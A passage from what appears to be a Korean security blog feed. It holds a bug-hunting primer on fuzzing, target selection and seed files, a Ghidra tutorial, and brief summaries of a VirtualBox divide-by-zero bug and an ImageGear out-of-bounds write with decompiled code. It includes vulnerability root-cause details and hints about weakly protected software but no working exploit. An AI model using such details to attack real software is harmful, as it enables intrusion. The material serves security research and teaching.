쉽죠?</p><p>2016년에는 eip만 바꿔서 제보를 해도 포상을 줬던 거 같은데 최근에는 꼭 풀 익스를 해야지만 포상을 준다고 하네요 ㅠㅠ</p><h1 id="취약점을-찾기-전에"><a href="#취약점을-찾기-전에" class="headerlink" title="취약점을 찾기 전에"></a>취약점을 찾기 전에</h1><p>취약점을 찾기 전에 먼저 알아둬야 할 것들에 대해서 먼저 얘기해볼게요</p><ol><li>모든 취약점은 untrust input으로부터 발생합니다. 무슨 취약점이든 간에 사용자가 컨트롤할 수 있고 프로그램에 전달되는 데이터의 조작에 의해서 버그가 발생합니다.</li><li>모든 버그가 익스 가능한 것이 아닙니다. 예를 들어 오버플로우가 발생했어도 미티게이션 때문에 익스를 못 할 수도 있고 아니면 eip 컨트롤할 수 있는 부분이 없어서 익스를 못할 수도 있습니다. → 실제 경험임. 오버 플로우 했는데 익스 못함…(사실 더 보기 귀찮아서 안 봄)</li><li>남이 이미 찾아서 제보를 했을 수도 있기 때문에 업데이트가 나오면 바로바로 확인해야 합니다. 익스하고 있는데 다른 사람이 먼저 제보해서 업데이트한 걸 모르고 있다가 시간만 날리면 억울하자나요 ㅠㅠ (자기 꺼는 패치 안될 거라 생각하지 마세요… 패치당하면 삶의 의욕이 사라집니다… ㅠㅠ)</li><li>국내 프로그램에는 외국 유명 프로그램보다는 취약점이 많은 편입니다.(아 물론 진짜 보안에 신경 쓴 프로그램을 제외하고요. 한글 같이….? ㅠㅠ 보안모듈 올라가고 나서는 익스 하기 힘들다고 하네요) 취약점을 찾을 때 가장 불안한 것이 “취약점이 없으면 어쩌지?”인데 보통 프로그램들이 옛날 모듈을 쓰거나 처음 설계할 때 보안에 신경 쓰지 않은 프로그램들이 있어서 취약점을 찾기에는 어렵지 않습니다. (아마도…?)</li></ol><p>그럼 취약점을 찾기 위해서는 무엇이 필요할까요?</p><ol><li>리버싱 : 취약점이 어디 있는지 그리고 프로그램이 어떻게 돌아가는지 확인하기 위해서는 리버싱에 익숙해져 있어야 합니다. 리버싱을 잘할수록 취약점을 더 빠르게 찾겠죠.</li><li>익스플로잇 : 이거는 취약점을 찾고 eip를 잡고 나서의 문제인데 사실 국내 프로그램을 익스 할 때에는 corelan의 <a href="https://www.corelan.be/index.php/category/security/exploit-writing-tutorials/">windows exploitation tutorial</a>만 읽어도 충분합니다.(대부분은? 저도 모든 프로그램을 해본 게 아니라 장담은 못하겠네요)</li><li>개발 능력 : 가장 중요하다고 생각하는 부분입니다. 개발 능력이 있으면 리버싱하는 데에도 도움이 되고 프로그램 구조를 좀 더 정확히 빨리 파악할 수 있다고 하네요. 저는 개발을 못해서 이렇게 해킹을 못하나 봅니다 ㅜㅠ 개발은 또 언제 공부하지…</li></ol><h1 id="취약점을-찾는-방법"><a href="#취약점을-찾는-방법" class="headerlink" title="취약점을 찾는 방법"></a>취약점을 찾는 방법</h1><p>취약점을 찾는 방법은 여러 가지가 있습니다.</p><ol><li>소스코드 오디팅</li><li>손 퍼징</li><li>퍼징</li></ol><p>일단 소스코드 오디팅의 경우 소스코드가 있어야겠죠?? 소스코드를 보면서 분석하고 취약점을 탐색하는 방법을 말합니다. 국내 프로그램에는 거의 사용하지 못하는 방법이네요 ㅠㅠ 음 헥스레이 보면서 하는 것도 해당 사항이 되려나요? 뭐 그냥 코드를 보고 분석하는 것을 두루두루 말하는 거라고 보면 되겠네요.</p><p>손퍼징 같은 경우 제가 처음 버그헌팅을 하면서 많이 사용했던 방법인데요. 그냥 노가다입니다. Untrust input을 직접 손으로 넣거나 수정해가면서 테스트하는 방법입니다.</p><p>Untrust input 이 파일일 때 파일 포맷에 대해서 알아가면서 직접 수정해가면서 테스트를 해보면 뭔가 이 위치는 무슨 역할이라는 느낌이 좀 옵니다. (아마? 디버깅도 같이 하면서 좀 많이 삽질해야 하긴 하지만). 물론 이것도 파일 포맷이 단순할 경우이기는 하지만요. 예를 들어서 문서 포맷인 경우에 파일에 문자열이 존재하고 앞에 숫자가 있으면 이게 대충 뒤에 있는 문자열의 폰트 정보이거나 문자열의 길이라는 것을 바로 보고 알거나 몇 번의 테스트를 통해서 알 수 있죠. 이렇게 하나하나 삽질을 해가면서 파일 포맷에 대한 이해를 높일 수 있습니다.</p><p>처음에는 자기가 파일에 대한 추측을 할 수 있고 인풋을 정확하게 알고 있기 때문에 디버깅하기에는 비교적 편하다는 장점이 있습니다. 하지만 직접 조작을 해야 하기 때문에 시간이 많이 들고 모든 포맷을 알 수 있는 것도 아닙니다. 특히 파일이 압축되어 있는 상태라면 더더욱 이게 뭘 하는지 알 수가 없습니다. 사실 스크립트 퍼징 할 때 더 많이 쓰는 방법입니다 ㅋㅋㅋ</p><p>따라서 어차피 그냥 뮤테이션을 할거 보통 퍼저를 사용해서 퍼징을 합니다. 퍼저에서는 주어진 시드 파일을 임의로 조작하여 테스트를 진행해줍니다. 그리고 크래시가 발생하면 원본 파일과 크래시 파일 그리고 크래시 정보를 저장하죠. 저도 퍼징을 많이 사용하고 있습니다.</p><p>퍼저를 직접 짜도 되지만 공개된 무료 퍼저가 많습니다!!! ㅎㅎ 개이득 BFF, Peach, AFL 또 그리고… 뭐 있었더라… ㅋㅋㅋ 기억이 잘 안 나는데 뭐 암튼 ㅋㅋㅋㅋ 저는 BFF를 자주 사용합니다. BFF는 아래 링크를 들어가면 다운로드할 수 있습니다.</p><p><a href="https://www.cert.org/vulnerability-analysis/tools/bff.cfm">https://www.cert.org/vulnerability-analysis/tools/bff.cfm</a></p><p>원래 이름은 FOE 였는데 업데이트되면서 BFF로 이름이 바뀌었네요 ㅋㅋ 참고로 놀란 게 원래 FOE가 윈도우만 지원했었는데 업데이트되면서 맥이랑 리눅스도 지원하게 됐네요!! 간단하게 맥에서 몇 개 돌려봤는데 뭔가 더 많이 터지는 이 느낌적인 느낌… 나중에 맥 애플리케이션 익스플로잇도 해봐야겠네요 ㅋㅋㅋ</p><p>암튼 BFF 등 퍼저의 사용법은 간단하게 검색만 해도 많이 나오니 스킵하도록 하겠습니다 ㅋㅋ</p><h1 id="타깃-선정"><a href="#타깃-선정" class="headerlink" title="타깃 선정"></a>타깃 선정</h1><p>타깃을 선정하는 건 매우 중요합니다!! 왜냐!!! 포상 금액이 달라지니까요!!! 그럼 명예의 전당 순위가 변동이 별로 안되니까요!!!!(뭐 딱히 상관은 없지만) 암튼 타깃을 선정하기 전에 버그 헌팅을 하는 목적을 정해야 합니다.</p><ol><li>난 돈을 벌고 싶다!!!! or 제로데이 맛이라도 보고 싶어요 ㅠㅠ 하나만 찾아보고 싶어요 ㅠㅠㅠ<ul><li>그럼 쉽고 익스 하기 쉬운 거 하시면 됩니다. 리얼루 그냥 날로 먹으면서 돈 많이 받을 수 있는 프로그램 좀 있어요 ㅋㅋ 하지만 여기에서는 실제 벤더 이름은 까지 않는 걸로… 잘 찾아보시면 은근히 많습니다. 모든 모듈에 Rebase, ASLR 안 걸려 있는 프로그램도 봤어요 ㅋㅋㅋㅋㅋㅋㅋㅋ</li></ul></li><li>난 지식과 명예를 얻겠다!!!<ul><li>CVE가 나올만한 프로그램을 대상으로 하시면 됩니다. 브라우저라던가 커널이라던가…. (아 근데 왜 요새 주변에 윈도우 커널 하는 사람이 많아진 느낌이지 내가 시작하려고 하니까 주변에서 다하네 다들 윈도우 커널 하지 마셈)</li></ul></li><li>그럼 나머진 뭐냐!!!!<ul><li>그냥 하시면 됩니다……. 심심해서 하는 거예요…….;;;</li></ul></li></ol><p>장난이고 ㅋㅋㅋ 음 그래서 타깃을 내가 아는 프로그램으로만 할 것이냐?? ㄴㄴ 그건 아니죠</p><p><a href="http://software.naver.com/main.nhn">http://software.naver.com/main.nhn</a></p><p>네이버에서 이렇게 소프트웨어 자료실을 운영하고 있습니다. 보급도나 이런 건 정확한 수치로는 안 나와 있지만 추측은 가능하죠 ㅋㅋ 인기 많은 게 사람들이 많이 쓰는 거겠죠?? 네이버뿐만 아니라 다음이나 다른 사이트에서도 비슷한 것들이 있으니 이런 사이트에서 찾으시면 될 거 같습니다.</p><h1 id="시드-파일"><a href="#시드-파일" class="headerlink" title="시드 파일"></a>시드 파일</h1><p>퍼저에서 양질의 결과를 나오게 하기 위해서는 양질의 시드 파일을 넣는 것도 매우 중요합니다 ㅋㅋㅋ</p><p>먼저 타깃 프로그램의 어떤 부분을 퍼징 할 것인지 정해야 합니다. 미디어 플레이어의 경우, 음악이나 동영상의 포맷만 결정하면 되긴 하지만(그렇다고는 하지만 버전이나 압축 방식, 운영방식 등등의 차이로 기능의 차이가 좀 있습니다. 그렇기 때문에 같은 포맷이더라도 샘플이 많을수록 좋죠), 워드나 한글 같이 기능이 많은 프로그램들은 구체적으로 어떤 기능에 대해서 퍼징을 진행할지를 결정해야 합니다. 이렇게 안 하고 그냥 막 만들면 리버싱 할 때 필요 없는 부분 리버싱 하느라 시간 낭비하기 일쑤입니다 ㅠㅠ 따라서 먼저 프로그램을 써보면서 어떤 기능이 있는지 파악하고 괜찮겠다 싶은 기능들을 정리해서 하나하나에 대한 시드 파일을 따로 제작하는 게 제일 좋습니다.</p><p>제일 좋은 방법은 직접 시드 파일을 제작하는 것입니다. 직접 제작하면 안에 데이터를 원하는 데로 조작할 수 있고 타깃이 명확하기 때문에 리버싱 할 때 편리함이 있습니다. 직접 시드 파일을 만드는 거는 뒤에서 또 얘기하도록 하겠습니다.</p><p>직접 만들기 애매하거나 귀찮을 경우에는 구글 검색으로 다운로드하면 됩니다. Filetype으로 원하는 포맷 찾아서 다양한 시드 파일을 다운로드할 수 있습니다.</p><hr><p>Part 2에서는 실제로 제보했던 미디어 플레이어 KMPlayer의 취약점이 발생하는 파일 포맷에 대해 분석하는 글로 돌아오겠습니다!</p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>research</tag>
      
      <tag>bug hunting</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Research] Re:versing으로 시작하는 ghidra 생활 Part 2 - Data, Functions, Scripts</title>
    <link href="/2021/03/07/idioth/ghidra_part2/"/>
    <url>/2021/03/07/idioth/ghidra_part2/</url>
    
    <content type="html"><![CDATA[<p><strong>다른 파트 보러가기</strong></p><p><a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Re:versing으로 시작하는 ghidra 생활 Part 1 - Overview</a></p><p>Re:versing으로 시작하는 ghidra 생활 Part 2 - Data, Functions, Scripts (Here!)</p><p><a href="https://hackyboiz.github.io/2021/04/04/idioth/ghidra_part3">Re:versing으로 시작하는 ghidra 생활 Part 3 - tips for IDA User</a></p><p><a href="https://hackyboiz.github.io/2021/05/19/idioth/ghidra_part4/">Re:versing으로 시작하는 ghidra 생활 Part 4 - Malware Analysis (1)</a></p><p><a href="https://hackyboiz.github.io/2021/07/11/idioth/ghidra_part5/">Re:versing으로 시작하는 ghidra 생활 Part 5 - Malware Analysis (2)</a></p><hr><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%201.png"></p><p>파트 2로 돌아왔습니다. 요즘 날씨가 많이 따뜻해졌네요. 최근 제가 하던 게임<del>(유사 도박)</del>에서 이슈가 터져서 공중파에도 출현하고 있습니다. 닉네임답게 주위에서 하는 말을 무시한 채 즐기고 있었습니다만… 뭐 아무튼 오랜 시간 즐겼던 입장이라 마음이 아프네요. <del>혹시 저와 같은 게임을 하시던 분이라면 잃어버린 아크를 찾으러</del></p><p>딴 소리는 그만하고 <a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">저번 파트</a>에서는 ghidra에 대한 전반적인 것에 대해서 알아보았습니다. 이번 파트는 데이터 변환, 데이터 타입 적용, 함수 호출 트리 및 그래프, 스크립트 매니저와 메모리 맵에 대해서 다룰 예정입니다.</p><p>이번 시간에 예제로 다룰 바이너리는 총 두 가지입니다. <a href="https://hackyboiz.github.io/2021/02/07/idioth/ghidra_part1/">Part 1</a>에서 다루었던 바이너리와 <a href="http://reversing.kr/">reversing.kr</a>에 업로드된 Easy Keygen 문제입니다.</p><h1 id="데이터-변환"><a href="#데이터-변환" class="headerlink" title="데이터 변환"></a>데이터 변환</h1><p>분석을 수행할 때 각자 선호하는 데이터 타입이 있을 수도 있고, 아니면 부정확하게 데이터 타입이 표시되는 경우가 있습니다. 10진수로 보고 싶은데 16진수로 표시되어 있거나 그 반대인 경우가 있죠.</p><p>자 일단 ghidra를 통해 crackme.exe 바이너리 파일을 연 후 main 함수로 들어가 봅시다. 좌측 Symbol Tree에서 Functions 폴더를 확장하고 <code>_main</code> 함수를 찾아서 클릭해주시면 중앙 화면과 디스 어셈블 창에서 main 함수를 출력해줍니다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%202.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%203.png"></p><p>저번 파트에서 입력 값이 <code>0x1232b14</code>여야 하는 점은 알았습니다. 근데 그냥 대충 쓱 훑어보고 <code>0x1232b14</code>에서 0x를 뺀 <code>1232b14</code>를 적는다면?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%204.png"></p><p>Fail 문구를 봐버립니다… 계산기를 켜고 입력해서 10진수로 변환하기 귀찮고, python을 켜서 <code>0x1232b14</code>를 10진수로 변환하기도 귀찮은데 ghidra에서 바로 변환할 수 있는 방법은 없을까???</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%205.png"></p><p>변환할 수 있는 방법이 없다면 IDA를 사용하지 왜 ghidra를 사용하겠습니까? 당연히 존재합니다!!!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%206.png"></p><p>커서를 자신이 변환하길 원하는 데이터에 클릭을 합니다. 그러면 Listing 창은 커서가 위치한 곳에 해당하는 어셈블리로 자동으로 이동하게 됩니다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%207.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%208.png"></p><p>그 후 원하는 데이터 값을 우클릭 - Convert - 원하는 타입으로 클릭하면 데이터 타입이 변경됩니다. 값이 정상적으로 바뀌었는지 한 번 확인을 해봅시다!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%209.png"></p><p>값이 정상적으로 변환된 것을 볼 수 있습니다. :)</p><h1 id="데이터-타입-적용"><a href="#데이터-타입-적용" class="headerlink" title="데이터 타입 적용"></a>데이터 타입 적용</h1><p>ghidra에서 바이트 배열은 조금 독특하게 표시됩니다. 대부분 crackme 문제를 풀기 위해서, 혹은 분석하기 위해서는 이 바이트 배열이 문자열인지 아닌지를 판별해야 합니다. 물론 ghidra에서는 바이트 배열을 문자열로 변환하는 것 같은 데이터 타입 적용이 존재합니다. :)</p><p>이번 부분에 대해서 살펴보기 전에 Easy Keygen 바이너리를 ghidra로 열어봅시다!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2010.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2011.png"></p><p>main 함수로 가기 위해서 entry point에서 <code>FUN_00401000</code>을 클릭하여 이동하여 줍니다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2012.png"></p><p>main 함수를 살펴보던 중 <code>&amp;DAT_0040805c</code>라는 녀석을 만났습니다. 이 녀석은 무슨 값일까… 한 번 확인해봅시다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2013.png"></p><p><code>%s</code>였네요. 근데 데이터 타입이 정의되어 있지 않습니다. 디 컴파일 창만 본다면 한눈에 어떤 값인지 들어오지가 않습니다. 이 녀석을 한 번 변환시켜 볼까요?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2014.png"></p><p><code>DAT_0040805c</code> 우클릭 → Data → string을 누르면?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2015.png"></p><p>음… 뭔가 한눈에 확 들어오진 않지만 어떤 값인지는 대충 알 수 있게 변했습니다.</p><h1 id="함수-호출-트리와-호출-그래프"><a href="#함수-호출-트리와-호출-그래프" class="headerlink" title="함수 호출 트리와 호출 그래프"></a>함수 호출 트리와 호출 그래프</h1><p>분석을 하다 보면 이 함수가 어디에서 호출되는지, 이 함수가 어떤 함수를 호출하는지 확인해야 할 때가 있습니다. 함수 호출 트리를 통해 이 작업을 간단하게 수행할 수 있습니다. Easy Keygen 바이너리에서 메인 함수가 어떤 함수에 의해서 호출이 되는지, 메인 함수는 어떤 함수를 호출하는지 함수 호출 트리를 통해서 확인을 해볼까요?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2016.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2017.png"></p><p>main 함수에 위치한 채로 Window → Function Call Tress를 클릭하면 기본적으로 화면 하단에 함수 호출 트리가 나타나게 됩니다.(저는 이미지가 좌우로 길게 늘어져서 화면 바깥으로 뺐습니다…^^;;)</p><p>함수 호출 트리를 보면 <code>FUN_00401000</code>은 <code>entry</code>에 의해서 호출되었고, <code>FUN_00401150</code>, <code>FUN_004011a2</code>, <code>FUN_004011b9</code>를 호출하는 것을 볼 수 있습니다. 이런 식으로 한눈에 확인할 수 있겠지만 뭔가 그림으로 되어있으면 좀 더 알아보기 편하겠죠? 그렇다면 Window → Function Call Graph를 클릭해줍니다!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2018.png"></p><p>좀 더 알아보기 쉽게 어떤 함수에 의해서 호출되고 어떤 함수를 호출하는지 한눈에 확인할 수 있습니다. 물론 이런 창들은 모두 커스터마이징 해서 원하는 위치에 둘 수 있습니다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2019.png"></p><p>이런 식으로도 구성할 수 있죠. 함수를 이동할 때마다 어떤 함수를 호출하는지 확인할 수 있는 겁니다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2020.png"></p><h1 id="스크립트-매니저"><a href="#스크립트-매니저" class="headerlink" title="스크립트 매니저"></a>스크립트 매니저</h1><p>점점 ghidra 생활이 편리해지고 있습니다. ghidra만 있으면 어셈도 보고 디컴파일도 보고 함수 그래프도 보고 데이터 타입도 내가 원하는 대로 이것저것 수정하면서 모든 걸 다 할 수 있을 듯한 느낌입니다.</p><p>근데 아직 뭔가 허전합니다… 문제를 풀다가 암호문이 나와서 스크립트를 짜야할 것 같은데… 난 ghidra만 있으면 뭐든지 다 할 수 있을 것이라 생각했는데 vscode를 켜서 스크립트를 작성하고 cmd를 켜서 python을 실행하여 스크립트를 실행합니다. 기분이 나쁩니다. ghidra를 통해서 뭐든 해내고 싶습니다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2021.png"></p><p>욕심을 부리고 싶습니다. 툴 하나로 다 해버리고 싶습니다. 혼자서 다 때려 부수고 다니는 저기 저 슬라임처럼요. 그렇다면 스크립트 매니저가 여러분을 도와줄 겁니다! ghidra에서는 IDA Python처럼 JAVA와 python 등을 실행할 수 있는 스크립트 매니저가 존재합니다. 백문이 불여일견! 눈으로 직접 확인해봅시다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2022.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2023.png"></p><p>Window → Script Manager를 클릭하면 스크립트 매니저 창이 실행되고 굉장히 많은 스크립트들이 나타납니다. 카테고리로 많이 분류가 되어있습니다. 근데 나는 여기 있는 거 말고 내가 직접 짠 python 스크립트를 실행하고 싶습니다… <code>Hello, ghidra World!</code>를 출력하고 싶습니다. 그렇다면 한 번 스크립트를 직접 작성해볼까요?</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2024.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2025.png"></p><p>먼저 Bundle Manager를 실행시켜서 스크립트들의 경로를 확인해봅시다. <code>$USER_HOME/ghidra_scripts</code>에 내가 작성한 스크립트가 저장될 것 같은데 <code>file not found</code>라고 뜹니다. 음… 바탕화면에 스크립트를 저장할 디렉터리를 만들고 거기에 작성한 스크립트를 넣어봅시다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2026.png"></p><p><code>USER_HOME</code>에 ghidra_scripts 폴더를 만들었으니 이제 스크립트를 생성해보도록 합시다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2027.png"></p><p>번들 매니저에서 초록색 + 버튼을 누른 후 바탕화면의 ghidra_scripts 폴더를 지정하면…</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2028.png"></p><p>추가가 되었습니다. 이제 해당 디렉터리에 Python 스크립트를 작성한 후 저장해봅시다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2029.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2030.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2031.png"></p><p>양피지 모양을 클릭하고 Python 스크립트를 작성할 것이니 Python을 체크하고 스크립트 이름을 입력해줍니다. 만약 추가한 디렉터리가 여러 개라면 디렉터리 선택 부분에 여러 개의 디렉터리가 뜨겠죠? :) OK 버튼을 클릭해줍시다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2032.png"></p><p>이런 식으로 편집창이 뜨고 원하는 스크립트를 작성만 하면 되는 것 같습니다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2033.png"></p><p>코드를 작성하고 저장한 후 실행시켜봅시다!</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2034.png"></p><p>아래 콘솔 창에 <code>hello.py</code>가 실행돼서 정상적으로 문구가 뜨는 것을 보실 수 있습니다.</p><h1 id="메모리-맵"><a href="#메모리-맵" class="headerlink" title="메모리 맵"></a>메모리 맵</h1><p>이제 벌써 마지막이네요… 메모리 맵입니다. 리버싱을 하거나 아니면 포너블을 하다 보면 메모리 블록들이 어떠한 권한을 가지고 있는지 확인해야 할 때가 있습니다. 혹은 Base Address가 변경되었을 때 함수가 어떤 주소를 갖는지 계산을 해야 할 때도 있죠. 그럴 때 역시 다른 도구를 사용하지 않고 ghidra에서 해치울 수 있습니다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2035.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2036.png"></p><p>Window - Memory Map을 클릭하여 메모리 맵을 실행 하면 위와 같은 창을 볼 수 있습니다. 어떤 블록이 무슨 권한을 가지고 있는지, 초기화가 되어있는지 등이 모두 표시되죠. 베이스 주소를 변경한 채로 함수 주소들을 확인하고 싶으면 상단의 집 모양을 눌러서 Base Address를 수정해주기만 하면 됩니다.</p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2037.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2038.png"></p><p><img src="/2021/03/07/idioth/ghidra_part2/Untitled%2039.png"></p><p>Base Image Address를 0으로 바꾸어 버렸더니 모든 함수들이 오프셋 주소로만 표시되는 모습을 볼 수 있습니다.</p><h1 id="The-End"><a href="#The-End" class="headerlink" title="The End"></a>The End</h1><p>오늘은 데이터 변환, 데이터 타입 적용, 함수 호출 트리/그래프, 스크립트 매니저, 메모리 맵에 대해서 알아보았습니다. 이제 ghidra에 대해서는 모든 사용법을 획득한 것 같습니다. 무서운 용이라고 생각하고 레이드 할 생각에 들떠 있었는데 생각보다 싱거웠네요.</p><p>하지만! 원래 몬스터를 한 번 수렵 했으면 이제 자잘한 팁이나 TA(타임어택)을 하는 것이 강호의 도리! The End라는 문구만 보고 끝났다고 생각하셨다면<del>(끝나길 바라셨을 수도 있겠지만)</del> 서운합니다… 다음 파트에서는 IDA Pro를 사용했던 사용자들에 대한 ghidra Tips 모음집을 들고 오도록 하겠습니다. 그럼 다들 좋은 하루 보내시길 바랍니다!</p><h1 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h1><p><a href="https://www.shogunlab.com/blog/2019/12/22/here-be-dragons-ghidra-1.html">https://www.shogunlab.com/blog/2019/12/22/here-be-dragons-ghidra-1.html</a></p><p><a href="https://ghidra.re/courses/GhidraClass/Intermediate/Scripting_withNotes.html#Scripting.html">https://ghidra.re/courses/GhidraClass/Intermediate/Scripting_withNotes.html#Scripting.html</a></p><p><a href="https://ghidra-sre.org/CheatSheet.html">https://ghidra-sre.org/CheatSheet.html</a></p>]]></content>
    
    
    <categories>
      
      <category>Research</category>
      
    </categories>
    
    
    <tags>
      
      <tag>idioth</tag>
      
      <tag>reversing</tag>
      
      <tag>ghidra</tag>
      
      <tag>ghidra tutorials</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-2127: Oracle VirtualBox Divide by Zero DoS</title>
    <link href="/2021/03/06/fabu1ous/2021-03-06/"/>
    <url>/2021/03/06/fabu1ous/2021-03-06/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a><strong>URL</strong></h2><p><a href="https://candymate.tistory.com/20?category=964271">CVE-2021-2127</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a><strong>Target</strong></h2><p>Oracle VirtualBox 6.1.16 (realease 2020/11/17)</p><p>Windows 호스트 제외</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a><strong>Explain</strong></h2><p>Oracle VirtualBox 6.1.16에서 Divide by zero 취약점이 발견되었습니다. VMWare SVGA II PCI를 통해 전달된 커맨드들은 SVGA command buffer에 저장된 후 FIFO loop을 통해 파싱 및 실행됩니다. 함수 <code>vmsvgaR3FifoLoop</code>는 switch-case문을 통해 상황에 맞는 <code>vmsvga~</code> 함수를 호출하는 것으로 커맨드를 처리합니다. 그중 <code>SVGA_3D_CMD_SURFACE_DMA</code> 커맨드를 처리하는 <code>vmsvga3dSurfaceDMA</code>에서 divide by zero 취약점이 있습니다.</p><pre><code class="hljs c++">AssertReturn(srcz &lt; UINT32_MAX / pMipLevel-&gt;mipmapSize.<span class="hljs-built_in">height</span> / cbGuestPitch, VERR_INVALID_PARAMETER);</code></pre><p>위는 Divide by zero 취약점이 발생하는 코드이고, Root cause는 다음과 같습니다.</p><ol><li><p>Invalid surface가 정의될 수 있음.</p><p><code>mipmap</code>의 값이 0이 아니며, <code>cbGuestPitch</code>의 값이 0인 surface가 정의될 수 있습니다.</p></li><li><p>Texture는 Invalid surface에 bound 됨</p><p>Texture가 surface에 bound 되어야 취약점에 도달할 수 있습니다. </p></li><li><p>제수(divisor)의 검사 부재</p></li></ol><p>해당 취약점을 통해 3D acceleration 옵션이 켜져 있는 VM들을 대상으로 로컬 혹은 원격 Crash를 발생시킬 수 있습니다.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>dos</tag>
      
      <tag>divide by zero</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[하루한줄] CVE-2021-21784: Accusoft ImageGear의 OOB write를 통한 임의 코드 실행 취약점</title>
    <link href="/2021/03/05/l0ch/2021-03-05/"/>
    <url>/2021/03/05/l0ch/2021-03-05/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://talosintelligence.com/vulnerability_reports/TALOS-2021-1248">Accusoft ImageGear JPG format SOF marker processing out-of-bounds write vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Accusoft ImageGear ≤ 19.8</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Accusoft의 ImageGear 라이브러리에서 JPG 포맷의 파일을 처리할 때 발생하는 OOB write 취약점을 통한 임의 코드 실행 취약점의 세부 정보가 공개되었습니다. ImageGear는 이미지 변환, 생성, 편집, 주석 등을 제공하는 이미지 툴킷이며 DICOM, PDF, Microsoft Office 등 100개 이상의 형식을 지원합니다.</p><p>취약점은 JPG파일 로드 과정의 <code>handle_color_channel_with_high_precision</code> 함수에서 발생합니다.</p><pre><code class="hljs c"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">handle_color_channel_with_high_precision</span><span class="hljs-params">(undefined4 param_1,<span class="hljs-keyword">int</span> width,<span class="hljs-keyword">short</span> *param_3,</span></span><span class="hljs-function"><span class="hljs-params">                                <span class="hljs-keyword">short</span> *param_,<span class="hljs-keyword">short</span> *param_5,<span class="hljs-keyword">short</span> *raster_buffer,<span class="hljs-keyword">int</span> param_7,<span class="hljs-keyword">int</span> param_8)</span></span><span class="hljs-function"></span>&#123;   [...]  <span class="hljs-keyword">if</span> (<span class="hljs-number">0</span> &lt; width) &#123;raster_buffer = raster_buffer + <span class="hljs-number">2</span>;<span class="hljs-keyword">do</span> &#123;...<span class="hljs-keyword">if</span> (short_3 &lt; <span class="hljs-number">0</span>)&#123;short_3 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">if</span> (<span class="hljs-number">0xfff</span> &lt; short_3)short_3 = <span class="hljs-number">0xfff</span>;&#125;raster_buffer[<span class="hljs-number">-2</span>] = (<span class="hljs-keyword">short</span>)short_3;<span class="hljs-keyword">if</span> (short_2 &lt; <span class="hljs-number">0</span>)&#123;short_2 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">if</span> (<span class="hljs-number">0xfff</span> &lt; short_2)short_2 = <span class="hljs-number">0xfff</span>;&#125;raster_buffer[<span class="hljs-number">-1</span>] = (<span class="hljs-keyword">short</span>)short_2;<span class="hljs-keyword">if</span> (short_1 &lt; <span class="hljs-number">0</span>)&#123;short_1 = <span class="hljs-number">0</span>;&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-keyword">if</span> (<span class="hljs-number">0xfff</span> &lt; short_1)short_1 = <span 